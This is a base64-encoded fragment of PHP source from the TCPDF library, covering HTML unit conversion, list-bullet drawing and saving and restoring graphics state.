mcgdmFsdWUgYW5kIHVuaXQgb2YgbWVhc3VyZSB0byB1c2VyJ3MgdW5pdHMgb3IgcG9pbnRzLgoJICogQHBhcmFtIHN0cmluZyAkaHRtbHZhbCBTdHJpbmcgY29udGFpbmluZyB2YWx1ZXMgYW5kIHVuaXQuCgkgKiBAcGFyYW0gc3RyaW5nICRyZWZzaXplIFJlZmVyZW5jZSB2YWx1ZSBpbiBwb2ludHMuCgkgKiBAcGFyYW0gc3RyaW5nICRkZWZhdWx0dW5pdCBEZWZhdWx0IHVuaXQgKGNhbiBiZSBvbmUgb2YgdGhlIGZvbGxvd2luZzogJSwgZW0sIGV4LCBweCwgaW4sIG1tLCBwYywgcHQpLgoJICogQHBhcmFtIGJvb2xlYW4gJHBvaW50cyBJZiB0cnVlIHJldHVybnMgcG9pbnRzLCBvdGhlcndpc2UgcmV0dXJucyB2YWx1ZSBpbiB1c2VyJ3MgdW5pdHMuCgkgKiBAcmV0dXJuIGZsb2F0IHZhbHVlIGluIHVzZXIncyB1bml0IG9yIHBvaW50IGlmICRwb2ludHM9dHJ1ZQoJICogQHB1YmxpYwoJICogQHNpbmNlIDQuNC4wMDQgKDIwMDgtMTItMTApCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBnZXRIVE1MVW5pdFRvVW5pdHMoJGh0bWx2YWwsICRyZWZzaXplPTEsICRkZWZhdWx0dW5pdD0ncHgnLCAkcG9pbnRzPWZhbHNlKSB7CgkJJHN1cHBvcnRlZHVuaXRzID0gYXJyYXkoJyUnLCAnZW0nLCAnZXgnLCAncHgnLCAnaW4nLCAnY20nLCAnbW0nLCAncGMnLCAncHQnKTsKCQkkcmV0dmFsID0gMDsKCQkkdmFsdWUgPSAwOwoJCSR1bml0ID0gJ3B4JzsKCQlpZiAoJHBvaW50cykgewoJCQkkayA9IDE7CgkJfSBlbHNlIHsKCQkJJGsgPSAkdGhpcy0+azsKCQl9CgkJaWYgKGluX2FycmF5KCRkZWZhdWx0dW5pdCwgJHN1cHBvcnRlZHVuaXRzKSkgewoJCQkkdW5pdCA9ICRkZWZhdWx0dW5pdDsKCQl9CgkJaWYgKGlzX251bWVyaWMoJGh0bWx2YWwpKSB7CgkJCSR2YWx1ZSA9IGZsb2F0dmFsKCRodG1sdmFsKTsKCQl9IGVsc2VpZiAocHJlZ19tYXRjaCgnLyhbMC05XC5cLVwrXSspLycsICRodG1sdmFsLCAkbW51bSkpIHsKCQkJJHZhbHVlID0gZmxvYXR2YWwoJG1udW1bMV0pOwoJCQlpZiAocHJlZ19tYXRjaCgnLyhbYS16JV0rKS8nLCAkaHRtbHZhbCwgJG11bml0KSkgewoJCQkJaWYgKGluX2FycmF5KCRtdW5pdFsxXSwgJHN1cHBvcnRlZHVuaXRzKSkgewoJCQkJCSR1bml0ID0gJG11bml0WzFdOwoJCQkJfQoJCQl9CgkJfQoJCXN3aXRjaCAoJHVuaXQpIHsKCQkJLy8gcGVyY2VudGFnZQoJCQljYXNlICclJzogewoJCQkJJHJldHZhbCA9ICgoJHZhbHVlICogJHJlZnNpemUpIC8gMTAwKTsKCQkJCWJyZWFrOwoJCQl9CgkJCS8vIHJlbGF0aXZlLXNpemUKCQkJY2FzZSAnZW0nOiB7CgkJCQkkcmV0dmFsID0gKCR2YWx1ZSAqICRyZWZzaXplKTsKCQkJCWJyZWFrOwoJCQl9CgkJCS8vIGhlaWdodCBvZiBsb3dlciBjYXNlICd4JyAoYWJvdXQgaGFsZiB0aGUgZm9udC1zaXplKQoJCQljYXNlICdleCc6IHsKCQkJCSRyZXR2YWwgPSAoJHZhbHVlICogKCRyZWZzaXplIC8gMikpOwoJCQkJYnJlYWs7CgkJCX0KCQkJLy8gYWJzb2x1dGUtc2l6ZQoJCQljYXNlICdpbic6IHsKCQkJCSRyZXR2YWwgPSAoKCR2YWx1ZSAqICR0aGlzLT5kcGkpIC8gJGspOwoJCQkJYnJlYWs7CgkJCX0KCQkJLy8gY2VudGltZXRlcnMKCQkJY2FzZSAnY20nOiB7CgkJCQkkcmV0dmFsID0gKCgkdmFsdWUgLyAyLjU0ICogJHRoaXMtPmRwaSkgLyAkayk7CgkJCQlicmVhazsKCQkJfQoJCQkvLyBtaWxsaW1ldGVycwoJCQljYXNlICdtbSc6IHsKCQkJCSRyZXR2YWwgPSAoKCR2YWx1ZSAvIDI1LjQgKiAkdGhpcy0+ZHBpKSAvICRrKTsKCQkJCWJyZWFrOwoJCQl9CgkJCS8vIG9uZSBwaWNhIGlzIDEyIHBvaW50cwoJCQljYXNlICdwYyc6IHsKCQkJCSRyZXR2YWwgPSAoKCR2YWx1ZSAqIDEyKSAvICRrKTsKCQkJCWJyZWFrOwoJCQl9CgkJCS8vIHBvaW50cwoJCQljYXNlICdwdCc6IHsKCQkJCSRyZXR2YWwgPSAoJHZhbHVlIC8gJGspOwoJCQkJYnJlYWs7CgkJCX0KCQkJLy8gcGl4ZWxzCgkJCWNhc2UgJ3B4JzogewoJCQkJJHJldHZhbCA9ICR0aGlzLT5waXhlbHNUb1VuaXRzKCR2YWx1ZSk7CgkJCQlpZiAoJHBvaW50cykgewoJCQkJCSRyZXR2YWwgKj0gJHRoaXMtPms7CgkJCQl9CgkJCQlicmVhazsKCQkJfQoJCX0KCQlyZXR1cm4gJHJldHZhbDsKCX0KCgkvKioKCSAqIE91dHB1dCBhbiBIVE1MIGxpc3QgYnVsbGV0IG9yIG9yZGVyZWQgaXRlbSBzeW1ib2wKCSAqIEBwYXJhbSBpbnQgJGxpc3RkZXB0aCBsaXN0IG5lc3RpbmcgbGV2ZWwKCSAqIEBwYXJhbSBzdHJpbmcgJGxpc3R0eXBlIHR5cGUgb2YgbGlzdAoJICogQHBhcmFtIGZsb2F0ICRzaXplIGN1cnJlbnQgZm9udCBzaXplCgkgKiBAcHJvdGVjdGVkCgkgKiBAc2luY2UgNC40LjAwNCAoMjAwOC0xMi0xMCkKCSAqLwoJcHJvdGVjdGVkIGZ1bmN0aW9uIHB1dEh0bWxMaXN0QnVsbGV0KCRsaXN0ZGVwdGgsICRsaXN0dHlwZT0nJywgJHNpemU9MTApIHsKCQlpZiAoJHRoaXMtPnN0YXRlICE9IDIpIHsKCQkJcmV0dXJuOwoJCX0KCQkkc2l6ZSAvPSAkdGhpcy0+azsKCQkkZmlsbCA9ICcnOwoJCSRiZ2NvbG9yID0gJHRoaXMtPmJnY29sb3I7CgkJJGNvbG9yID0gJHRoaXMtPmZnY29sb3I7CgkJJHN0cm9rZWNvbG9yID0gJHRoaXMtPnN0cm9rZWNvbG9yOwoJCSR3aWR0aCA9IDA7CgkJJHRleHRpdGVtID0gJyc7CgkJJHRtcHggPSAkdGhpcy0+eDsKCQkkbHNwYWNlID0gJHRoaXMtPkdldFN0cmluZ1dpZHRoKCcgICcpOwoJCWlmICgkbGlzdHR5cGUgPT0gJ14nKSB7CgkJCS8vIHNwZWNpYWwgc3ltYm9sIHVzZWQgZm9yIGF2b2lkIGp1c3RpZmljYXRpb24gb2YgcmVjdCBidWxsZXQKCQkJJHRoaXMtPmxpc3BhY2VyID0gJyc7CgkJCXJldHVybjsKCQl9IGVsc2VpZiAoJGxpc3R0eXBlID09ICchJykgewoJCQkvLyBzZXQgZGVmYXVsdCBsaXN0IHR5cGUgZm9yIHVub3JkZXJlZCBsaXN0CgkJCSRkZWZ0eXBlcyA9IGFycmF5KCdkaXNjJywgJ2NpcmNsZScsICdzcXVhcmUnKTsKCQkJJGxpc3R0eXBlID0gJGRlZnR5cGVzWygkbGlzdGRlcHRoIC0gMSkgJSAzXTsKCQl9IGVsc2VpZiAoJGxpc3R0eXBlID09ICcjJykgewoJCQkvLyBzZXQgZGVmYXVsdCBsaXN0IHR5cGUgZm9yIG9yZGVyZWQgbGlzdAoJCQkkbGlzdHR5cGUgPSAnZGVjaW1hbCc7CgkJfSBlbHNlaWYgKHN1YnN0cigkbGlzdHR5cGUsIDAsIDQpID09ICdpbWd8JykgewoJCQkvLyBjdXN0b20gaW1hZ2UgdHlwZSAoJ2ltZ3x0eXBlfHdpZHRofGhlaWdodHxpbWFnZS5leHQnKQoJCQkkaW1nID0gZXhwbG9kZSgnfCcsICRsaXN0dHlwZSk7CgkJCSRsaXN0dHlwZSA9ICdpbWcnOwoJCX0KCQlzd2l0Y2ggKCRsaXN0dHlwZSkgewoJCQkvLyB1bm9yZGVyZWQgdHlwZXMKCQkJY2FzZSAnbm9uZSc6IHsKCQkJCWJyZWFrOwoJCQl9CgkJCWNhc2UgJ2Rpc2MnOiB7CgkJCQkkciA9ICRzaXplIC8gNjsKCQkJCSRsc3BhY2UgKz0gKDIgKiAkcik7CgkJCQlpZiAoJHRoaXMtPnJ0bCkgewoJCQkJCSR0aGlzLT54ICs9ICRsc3BhY2U7CgkJCQl9IGVsc2UgewoJCQkJCSR0aGlzLT54IC09ICRsc3BhY2U7CgkJCQl9CgkJCQkkdGhpcy0+Q2lyY2xlKCgkdGhpcy0+eCArICRyKSwgKCR0aGlzLT55ICsgKCR0aGlzLT5sYXN0aCAvIDIpKSwgJHIsIDAsIDM2MCwgJ0YnLCBhcnJheSgpLCAkY29sb3IsIDgpOwoJCQkJYnJlYWs7CgkJCX0KCQkJY2FzZSAnY2lyY2xlJzogewoJCQkJJHIgPSAkc2l6ZSAvIDY7CgkJCQkkbHNwYWNlICs9ICgyICogJHIpOwoJCQkJaWYgKCR0aGlzLT5ydGwpIHsKCQkJCQkkdGhpcy0+eCArPSAkbHNwYWNlOwoJCQkJfSBlbHNlIHsKCQkJCQkkdGhpcy0+eCAtPSAkbHNwYWNlOwoJCQkJfQoJCQkJJHByZXZfbGluZV9zdHlsZSA9ICR0aGlzLT5saW5lc3R5bGVXaWR0aC4nICcuJHRoaXMtPmxpbmVzdHlsZUNhcC4nICcuJHRoaXMtPmxpbmVzdHlsZUpvaW4uJyAnLiR0aGlzLT5saW5lc3R5bGVEYXNoLicgJy4kdGhpcy0+RHJhd0NvbG9yOwoJCQkJJG5ld19saW5lX3N0eWxlID0gYXJyYXkoJ3dpZHRoJyA9PiAoJHIgLyAzKSwgJ2NhcCcgPT4gJ2J1dHQnLCAnam9pbicgPT4gJ21pdGVyJywgJ2Rhc2gnID0+IDAsICdwaGFzZScgPT4gMCwgJ2NvbG9yJz0+JGNvbG9yKTsKCQkJCSR0aGlzLT5DaXJjbGUoKCR0aGlzLT54ICsgJHIpLCAoJHRoaXMtPnkgKyAoJHRoaXMtPmxhc3RoIC8gMikpLCAoJHIgKiAoMSAtICgxLzYpKSksIDAsIDM2MCwgJ0QnLCAkbmV3X2xpbmVfc3R5bGUsIGFycmF5KCksIDgpOwoJCQkJJHRoaXMtPl9vdXQoJHByZXZfbGluZV9zdHlsZSk7IC8vIHJlc3RvcmUgbGluZSBzZXR0aW5ncwoJCQkJYnJlYWs7CgkJCX0KCQkJY2FzZSAnc3F1YXJlJzogewoJCQkJJGwgPSAkc2l6ZSAvIDM7CgkJCQkkbHNwYWNlICs9ICRsOwoJCQkJaWYgKCR0aGlzLT5ydGwpIHs7CgkJCQkJJHRoaXMtPnggKz0gJGxzcGFjZTsKCQkJCX0gZWxzZSB7CgkJCQkJJHRoaXMtPnggLT0gJGxzcGFjZTsKCQkJCX0KCQkJCSR0aGlzLT5SZWN0KCR0aGlzLT54LCAoJHRoaXMtPnkgKyAoKCR0aGlzLT5sYXN0aCAtICRsKSAvIDIpKSwgJGwsICRsLCAnRicsIGFycmF5KCksICRjb2xvcik7CgkJCQlicmVhazsKCQkJfQoJCQljYXNlICdpbWcnOiB7CgkJCQkvLyAxPT50eXBlLCAyPT53aWR0aCwgMz0+aGVpZ2h0LCA0PT5pbWFnZS5leHQKCQkJCSRsc3BhY2UgKz0gJGltZ1syXTsKCQkJCWlmICgkdGhpcy0+cnRsKSB7OwoJCQkJCSR0aGlzLT54ICs9ICRsc3BhY2U7CgkJCQl9IGVsc2UgewoJCQkJCSR0aGlzLT54IC09ICRsc3BhY2U7CgkJCQl9CgkJCQkkaW1ndHlwZSA9IHN0cnRvbG93ZXIoJGltZ1sxXSk7CgkJCQkkcHJldl95ID0gJHRoaXMtPnk7CgkJCQlzd2l0Y2ggKCRpbWd0eXBlKSB7CgkJCQkJY2FzZSAnc3ZnJzogewoJCQkJCQkkdGhpcy0+SW1hZ2VTVkcoJGltZ1s0XSwgJHRoaXMtPngsICgkdGhpcy0+eSArICgoJHRoaXMtPmxhc3RoIC0gJGltZ1szXSkgLyAyKSksICRpbWdbMl0sICRpbWdbM10sICcnLCAnVCcsICcnLCAwLCBmYWxzZSk7CgkJCQkJCWJyZWFrOwoJCQkJCX0KCQkJCQljYXNlICdhaSc6CgkJCQkJY2FzZSAnZXBzJzogewoJCQkJCQkkdGhpcy0+SW1hZ2VFcHMoJGltZ1s0XSwgJHRoaXMtPngsICgkdGhpcy0+eSArICgoJHRoaXMtPmxhc3RoIC0gJGltZ1szXSkgLyAyKSksICRpbWdbMl0sICRpbWdbM10sICcnLCB0cnVlLCAnVCcsICcnLCAwLCBmYWxzZSk7CgkJCQkJCWJyZWFrOwoJCQkJCX0KCQkJCQlkZWZhdWx0OiB7CgkJCQkJCSR0aGlzLT5JbWFnZSgkaW1nWzRdLCAkdGhpcy0+eCwgKCR0aGlzLT55ICsgKCgkdGhpcy0+bGFzdGggLSAkaW1nWzNdKSAvIDIpKSwgJGltZ1syXSwgJGltZ1szXSwgJGltZ1sxXSwgJycsICdUJywgZmFsc2UsIDMwMCwgJycsIGZhbHNlLCBmYWxzZSwgMCwgZmFsc2UsIGZhbHNlLCBmYWxzZSk7CgkJCQkJCWJyZWFrOwoJCQkJCX0KCQkJCX0KCQkJCSR0aGlzLT55ID0gJHByZXZfeTsKCQkJCWJyZWFrOwoJCQl9CgkJCS8vIG9yZGVyZWQgdHlwZXMKCQkJLy8gJHRoaXMtPmxpc3Rjb3VudFskdGhpcy0+bGlzdG51bV07CgkJCS8vICR0ZXh0aXRlbQoJCQljYXNlICcxJzoKCQkJY2FzZSAnZGVjaW1hbCc6IHsKCQkJCSR0ZXh0aXRlbSA9ICR0aGlzLT5saXN0Y291bnRbJHRoaXMtPmxpc3RudW1dOwoJCQkJYnJlYWs7CgkJCX0KCQkJY2FzZSAnZGVjaW1hbC1sZWFkaW5nLXplcm8nOiB7CgkJCQkkdGV4dGl0ZW0gPSBzcHJpbnRmKCclMDJkJywgJHRoaXMtPmxpc3Rjb3VudFskdGhpcy0+bGlzdG51bV0pOwoJCQkJYnJlYWs7CgkJCX0KCQkJY2FzZSAnaSc6CgkJCWNhc2UgJ2xvd2VyLXJvbWFuJzogewoJCQkJJHRleHRpdGVtID0gc3RydG9sb3dlcihUQ1BERl9TVEFUSUM6OmludFRvUm9tYW4oJHRoaXMtPmxpc3Rjb3VudFskdGhpcy0+bGlzdG51bV0pKTsKCQkJCWJyZWFrOwoJCQl9CgkJCWNhc2UgJ0knOgoJCQljYXNlICd1cHBlci1yb21hbic6IHsKCQkJCSR0ZXh0aXRlbSA9IFRDUERGX1NUQVRJQzo6aW50VG9Sb21hbigkdGhpcy0+bGlzdGNvdW50WyR0aGlzLT5saXN0bnVtXSk7CgkJCQlicmVhazsKCQkJfQoJCQljYXNlICdhJzoKCQkJY2FzZSAnbG93ZXItYWxwaGEnOgoJCQljYXNlICdsb3dlci1sYXRpbic6IHsKCQkJCSR0ZXh0aXRlbSA9IGNocig5NyArICR0aGlzLT5saXN0Y291bnRbJHRoaXMtPmxpc3RudW1dIC0gMSk7CgkJCQlicmVhazsKCQkJfQoJCQljYXNlICdBJzoKCQkJY2FzZSAndXBwZXItYWxwaGEnOgoJCQljYXNlICd1cHBlci1sYXRpbic6IHsKCQkJCSR0ZXh0aXRlbSA9IGNocig2NSArICR0aGlzLT5saXN0Y291bnRbJHRoaXMtPmxpc3RudW1dIC0gMSk7CgkJCQlicmVhazsKCQkJfQoJCQljYXNlICdsb3dlci1ncmVlayc6IHsKCQkJCSR0ZXh0aXRlbSA9IFRDUERGX0ZPTlRTOjp1bmljaHIoKDk0NSArICR0aGlzLT5saXN0Y291bnRbJHRoaXMtPmxpc3RudW1dIC0gMSksICR0aGlzLT5pc3VuaWNvZGUpOwoJCQkJYnJlYWs7CgkJCX0KCQkJLyoKCQkJLy8gVHlwZXMgdG8gYmUgaW1wbGVtZW50ZWQgKHNwZWNpYWwgaGFuZGxpbmcpCgkJCWNhc2UgJ2hlYnJldyc6IHsKCQkJCWJyZWFrOwoJCQl9CgkJCWNhc2UgJ2FybWVuaWFuJzogewoJCQkJYnJlYWs7CgkJCX0KCQkJY2FzZSAnZ2VvcmdpYW4nOiB7CgkJCQlicmVhazsKCQkJfQoJCQljYXNlICdjamstaWRlb2dyYXBoaWMnOiB7CgkJCQlicmVhazsKCQkJfQoJCQljYXNlICdoaXJhZ2FuYSc6IHsKCQkJCWJyZWFrOwoJCQl9CgkJCWNhc2UgJ2thdGFrYW5hJzogewoJCQkJYnJlYWs7CgkJCX0KCQkJY2FzZSAnaGlyYWdhbmEtaXJvaGEnOiB7CgkJCQlicmVhazsKCQkJfQoJCQljYXNlICdrYXRha2FuYS1pcm9oYSc6IHsKCQkJCWJyZWFrOwoJCQl9CgkJCSovCgkJCWRlZmF1bHQ6IHsKCQkJCSR0ZXh0aXRlbSA9ICR0aGlzLT5saXN0Y291bnRbJHRoaXMtPmxpc3RudW1dOwoJCQl9CgkJfQoJCWlmICghVENQREZfU1RBVElDOjplbXB0eV9zdHJpbmcoJHRleHRpdGVtKSkgewoJCQkvLyBDaGVjayB3aGV0aGVyIHdlIG5lZWQgYSBuZXcgcGFnZSBvciBuZXcgY29sdW1uCgkJCSRwcmV2X3kgPSAkdGhpcy0+eTsKCQkJJGggPSAkdGhpcy0+Z2V0Q2VsbEhlaWdodCgkdGhpcy0+Rm9udFNpemUpOwoJCQlpZiAoJHRoaXMtPmNoZWNrUGFnZUJyZWFrKCRoKSBPUiAoJHRoaXMtPnkgPCAkcHJldl95KSkgewoJCQkJJHRtcHggPSAkdGhpcy0+eDsKCQkJfQoJCQkvLyBwcmludCBvcmRlcmVkIGl0ZW0KCQkJaWYgKCR0aGlzLT5ydGwpIHsKCQkJCSR0ZXh0aXRlbSA9ICcuJy4kdGV4dGl0ZW07CgkJCX0gZWxzZSB7CgkJCQkkdGV4dGl0ZW0gPSAkdGV4dGl0ZW0uJy4nOwoJCQl9CgkJCSRsc3BhY2UgKz0gJHRoaXMtPkdldFN0cmluZ1dpZHRoKCR0ZXh0aXRlbSk7CgkJCWlmICgkdGhpcy0+cnRsKSB7CgkJCQkkdGhpcy0+eCArPSAkbHNwYWNlOwoJCQl9IGVsc2UgewoJCQkJJHRoaXMtPnggLT0gJGxzcGFjZTsKCQkJfQoJCQkkdGhpcy0+V3JpdGUoJHRoaXMtPmxhc3RoLCAkdGV4dGl0ZW0sICcnLCBmYWxzZSwgJycsIGZhbHNlLCAwLCBmYWxzZSk7CgkJfQoJCSR0aGlzLT54ID0gJHRtcHg7CgkJJHRoaXMtPmxpc3BhY2VyID0gJ14nOwoJCS8vIHJlc3RvcmUgY29sb3JzCgkJJHRoaXMtPnNldEZpbGxDb2xvckFycmF5KCRiZ2NvbG9yKTsKCQkkdGhpcy0+c2V0RHJhd0NvbG9yQXJyYXkoJHN0cm9rZWNvbG9yKTsKCQkkdGhpcy0+c2V0dGV4dENvbG9yQXJyYXkoJGNvbG9yKTsKCX0KCgkvKioKCSAqIFJldHVybnMgY3VycmVudCBncmFwaGljIHZhcmlhYmxlcyBhcyBhcnJheS4KCSAqIEByZXR1cm4gYXJyYXkgb2YgZ3JhcGhpYyB2YXJpYWJsZXMKCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSA0LjIuMDEwICgyMDA4LTExLTE0KQoJICovCglwcm90ZWN0ZWQgZnVuY3Rpb24gZ2V0R3JhcGhpY1ZhcnMoKSB7CgkJJGdyYXB2YXJzID0gYXJyYXkoCgkJCSdGb250RmFtaWx5JyA9PiAkdGhpcy0+Rm9udEZhbWlseSwKCQkJJ0ZvbnRTdHlsZScgPT4gJHRoaXMtPkZvbnRTdHlsZSwKCQkJJ0ZvbnRTaXplUHQnID0+ICR0aGlzLT5Gb250U2l6ZVB0LAoJCQknck1hcmdpbicgPT4gJHRoaXMtPnJNYXJnaW4sCgkJCSdsTWFyZ2luJyA9PiAkdGhpcy0+bE1hcmdpbiwKCQkJJ2NlbGxfcGFkZGluZycgPT4gJHRoaXMtPmNlbGxfcGFkZGluZywKCQkJJ2NlbGxfbWFyZ2luJyA9PiAkdGhpcy0+Y2VsbF9tYXJnaW4sCgkJCSdMaW5lV2lkdGgnID0+ICR0aGlzLT5MaW5lV2lkdGgsCgkJCSdsaW5lc3R5bGVXaWR0aCcgPT4gJHRoaXMtPmxpbmVzdHlsZVdpZHRoLAoJCQknbGluZXN0eWxlQ2FwJyA9PiAkdGhpcy0+bGluZXN0eWxlQ2FwLAoJCQknbGluZXN0eWxlSm9pbicgPT4gJHRoaXMtPmxpbmVzdHlsZUpvaW4sCgkJCSdsaW5lc3R5bGVEYXNoJyA9PiAkdGhpcy0+bGluZXN0eWxlRGFzaCwKCQkJJ3RleHRyZW5kZXJtb2RlJyA9PiAkdGhpcy0+dGV4dHJlbmRlcm1vZGUsCgkJCSd0ZXh0c3Ryb2tld2lkdGgnID0+ICR0aGlzLT50ZXh0c3Ryb2tld2lkdGgsCgkJCSdEcmF3Q29sb3InID0+ICR0aGlzLT5EcmF3Q29sb3IsCgkJCSdGaWxsQ29sb3InID0+ICR0aGlzLT5GaWxsQ29sb3IsCgkJCSdUZXh0Q29sb3InID0+ICR0aGlzLT5UZXh0Q29sb3IsCgkJCSdDb2xvckZsYWcnID0+ICR0aGlzLT5Db2xvckZsYWcsCgkJCSdiZ2NvbG9yJyA9PiAkdGhpcy0+Ymdjb2xvciwKCQkJJ2ZnY29sb3InID0+ICR0aGlzLT5mZ2NvbG9yLAoJCQknaHRtbHZzcGFjZScgPT4gJHRoaXMtPmh0bWx2c3BhY2UsCgkJCSdsaXN0aW5kZW50JyA9PiAkdGhpcy0+bGlzdGluZGVudCwKCQkJJ2xpc3RpbmRlbnRsZXZlbCcgPT4gJHRoaXMtPmxpc3RpbmRlbnRsZXZlbCwKCQkJJ2xpc3RudW0nID0+ICR0aGlzLT5saXN0bnVtLAoJCQknbGlzdG9yZGVyZWQnID0+ICR0aGlzLT5saXN0b3JkZXJlZCwKCQkJJ2xpc3Rjb3VudCcgPT4gJHRoaXMtPmxpc3Rjb3VudCwKCQkJJ2xpc3BhY2VyJyA9PiAkdGhpcy0+bGlzcGFjZXIsCgkJCSdjZWxsX2hlaWdodF9yYXRpbycgPT4gJHRoaXMtPmNlbGxfaGVpZ2h0X3JhdGlvLAoJCQknZm9udF9zdHJldGNoaW5nJyA9PiAkdGhpcy0+Zm9udF9zdHJldGNoaW5nLAoJCQknZm9udF9zcGFjaW5nJyA9PiAkdGhpcy0+Zm9udF9zcGFjaW5nLAoJCQknYWxwaGEnID0+ICR0aGlzLT5hbHBoYSwKCQkJLy8gZXh0ZW5kZWQKCQkJJ2xhc3RoJyA9PiAkdGhpcy0+bGFzdGgsCgkJCSd0TWFyZ2luJyA9PiAkdGhpcy0+dE1hcmdpbiwKCQkJJ2JNYXJnaW4nID0+ICR0aGlzLT5iTWFyZ2luLAoJCQknQXV0b1BhZ2VCcmVhaycgPT4gJHRoaXMtPkF1dG9QYWdlQnJlYWssCgkJCSdQYWdlQnJlYWtUcmlnZ2VyJyA9PiAkdGhpcy0+UGFnZUJyZWFrVHJpZ2dlciwKCQkJJ3gnID0+ICR0aGlzLT54LAoJCQkneScgPT4gJHRoaXMtPnksCgkJCSd3JyA9PiAkdGhpcy0+dywKCQkJJ2gnID0+ICR0aGlzLT5oLAoJCQknd1B0JyA9PiAkdGhpcy0+d1B0LAoJCQknaFB0JyA9PiAkdGhpcy0+aFB0LAoJCQknZndQdCcgPT4gJHRoaXMtPmZ3UHQsCgkJCSdmaFB0JyA9PiAkdGhpcy0+ZmhQdCwKCQkJJ3BhZ2UnID0+ICR0aGlzLT5wYWdlLAoJCQknY3VycmVudF9jb2x1bW4nID0+ICR0aGlzLT5jdXJyZW50X2NvbHVtbiwKCQkJJ251bV9jb2x1bW5zJyA9PiAkdGhpcy0+bnVtX2NvbHVtbnMKCQkJKTsKCQlyZXR1cm4gJGdyYXB2YXJzOwoJfQoKCS8qKgoJICogU2V0IGdyYXBoaWMgdmFyaWFibGVzLgoJICogQHBhcmFtIGFycmF5ICRndmFycyBhcnJheSBvZiBncmFwaGljIHZhcmlhYmxlc3RvIHJlc3RvcmUKCSAqIEBwYXJhbSBib29sZWFuICRleHRlbmRlZCBpZiB0cnVlIHJlc3RvcmUgZXh0ZW5kZWQgZ3JhcGhpYyB2YXJpYWJsZXMKCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSA0LjIuMDEwICgyMDA4LTExLTE0KQoJICovCglwcm90ZWN0ZWQgZnVuY3Rpb24gc2V0R3JhcGhpY1ZhcnMoJGd2YXJzLCAkZXh0ZW5kZWQ9ZmFsc2UpIHsKCQlpZiAoJHRoaXMtPnN0YXRlICE9IDIpIHsKCQkJIHJldHVybjsKCQl9CgkJJHRoaXMtPkZvbnRGYW1pbHkgPSAkZ3ZhcnNbJ0ZvbnRGYW1pbHknXTsKCQkkdGhpcy0+Rm9udFN0eWxlID0gJGd2YXJzWydGb250U3R5bGUnXTsKCQkkdGhpcy0+Rm9udFNpemVQdCA9ICRndmFyc1snRm9udFNpemVQdCddOwoJCSR0aGlzLT5yTWFyZ2luID0gJGd2YXJzWydyTWFyZ2luJ107CgkJJHRoaXMtPmxNYXJnaW4gPSAkZ3ZhcnNbJ2xNYXJnaW4nXTsKCQkkdGhpcy0+Y2VsbF9wYWRkaW5nID0gJGd2YXJzWydjZWxsX3BhZGRpbmcnXTsKCQkkdGhpcy0+Y2VsbF9tYXJnaW4gPSAkZ3ZhcnNbJ2NlbGxfbWFyZ2luJ107CgkJJHRoaXMtPkxpbmVXaWR0aCA9ICRndmFyc1snTGluZVdpZHRoJ107CgkJJHRoaXMtPmxpbmVzdHlsZVdpZHRoID0gJGd2YXJzWydsaW5lc3R5bGVXaWR0aCddOwoJCSR0aGlzLT5saW5lc3R5bGVDYXAgPSAkZ3ZhcnNbJ2xpbmVzdHlsZUNhcCddOwoJCSR0aGlzLT5saW5lc3R5bGVKb2luID0gJGd2YXJzWydsaW5lc3R5bGVKb2luJ107CgkJJHRoaXMtPmxpbmVzdHlsZURhc2ggPSAkZ3ZhcnNbJ2xpbmVzdHlsZURhc2gnXTsKCQkkdGhpcy0+dGV4dHJlbmRlcm1vZGUgPSAkZ3ZhcnNbJ3RleHRyZW5kZXJtb2RlJ107CgkJJHRoaXMtPnRleHRzdHJva2V3aWR0aCA9ICRndmFyc1sndGV4dHN0cm9rZXdpZHRoJ107CgkJJHRoaXMtPkRyYXdDb2xvciA9ICRndmFyc1snRHJhd0NvbG9yJ107CgkJJHRoaXMtPkZpbGxDb2xvciA9ICRndmFyc1snRmlsbENvbG9yJ107CgkJJHRoaXMtPlRleHRDb2xvciA9ICRndmFyc1snVGV4dENvbG9yJ107CgkJJHRoaXMtPkNvbG9yRmxhZyA9ICRndmFyc1snQ29sb3JGbGFnJ107CgkJJHRoaXMtPmJnY29sb3IgPSAkZ3ZhcnNbJ2JnY29sb3InXTsKCQkkdGhpcy0+Zmdjb2xvciA9ICRndmFyc1snZmdjb2xvciddOwoJCSR0aGlzLT5odG1sdnNwYWNlID0gJGd2YXJzWydodG1sdnNwYWNlJ107CgkJJHRoaXMtPmxpc3RpbmRlbnQgPSAkZ3ZhcnNbJ2xpc3RpbmRlbnQnXTsKCQkkdGhpcy0+bGlzdGluZGVudGxldmVsID0gJGd2YXJzWydsaXN0aW5kZW50bGV2ZWwnXTsKCQkkdGhpcy0+bGlzdG51bSA9ICRndmFyc1snbGlzdG51bSddOwoJCSR0aGlzLT5saXN0b3JkZXJlZCA9ICRndmFyc1snbGlzdG9yZGVyZWQnXTsKCQkkdGhpcy0+bGlzdGNvdW50ID0gJGd2YXJzWydsaXN0Y291bnQnXTsKCQkkdGhpcy0+bGlzcGFjZXIgPSAkZ3ZhcnNbJ2xpc3BhY2VyJ107CgkJJHRoaXMtPmNlbGxfaGVpZ2h0X3JhdGlvID0gJGd2YXJzWydjZWxsX2hlaWdodF9yYXRpbyddOwoJCSR0aGlzLT5mb250X3N0cmV0Y2hpbmcgPSAkZ3ZhcnNbJ2ZvbnRfc3RyZXRjaGluZyddOwoJCSR0aGlzLT5mb250X3NwYWNpbmcgPSAkZ3ZhcnNbJ2ZvbnRfc3BhY2luZyddOwoJCSR0aGlzLT5hbHBoYSA9ICRndmFyc1snYWxwaGEnXTsKCQlpZiAoJGV4dGVuZGVkKSB7CgkJCS8vIHJlc3RvcmUgZXh0ZW5kZWQgdmFsdWVzCgkJCSR0aGlzLT5sYXN0aCA9ICRndmFyc1snbGFzdGgnXTsKCQkJJHRoaXMtPnRNYXJnaW4gPSAkZ3ZhcnNbJ3RNYXJnaW4nXTsKCQkJJHRoaXMtPmJNYXJnaW4gPSAkZ3ZhcnNbJ2JNYXJnaW4nXTsKCQkJJHRoaXMtPkF1dG9QYWdlQnJlYWsgPSAkZ3ZhcnNbJ0F1dG9QYWdlQnJlYWsnXTsKCQkJJHRoaXMtPlBhZ2VCcmVha1RyaWdnZXIgPSAkZ3ZhcnNbJ1BhZ2VCcmVha1RyaWdnZXInXTsKCQkJJHRoaXMtPnggPSAkZ3ZhcnNbJ3gnXTsKCQkJJHRoaXMtPnkgPSAkZ3ZhcnNbJ3knXTsKCQkJJHRoaXMtPncgPSAkZ3ZhcnNbJ3cnXTsK